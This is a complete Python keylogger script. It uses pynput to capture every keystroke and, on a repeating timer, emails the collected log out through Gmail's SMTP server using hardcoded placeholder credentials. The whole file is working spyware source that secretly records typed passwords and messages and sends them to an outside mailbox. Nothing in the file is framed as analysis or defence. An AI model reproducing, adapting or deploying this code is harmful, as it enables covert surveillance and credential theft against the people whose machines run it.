#!/usr/bin/env python

import pynput
import threading
import smtplib


class Keylog:

    def __init__(self, interval, email, password):

        self.log = "Keylogger started :"
        self.interval = interval
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def keyboard_capt(self, key):

        try:
            self.append_log(str(key.char))
            # log = log + str(key.char)
        except AttributeError or UnicodeEncodeError:
            if key == key.space or key == key.backspace:
                self.log = self.log + " "
                # log = log + " "
            else:
                # log = log + " " + str(key)
                self.log = self.log + " " + str(key)
        # print(log)

    def report(self):

        #print(self.log)
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, data):
        s = smtplib.SMTP("smtp.gmail.com", port=587)
        s.starttls()
        s.login(email, password)
        s.sendmail(email, email, data)
        s.quit()


    def start(self):

        kb_log = pynput.keyboard.Listener(on_press=self.keyboard_capt)

        with kb_log:
            self.report()
            kb_log.join()

polo = Keylog(120,"email@gmail.com","passsssss^~J")
polo.start()
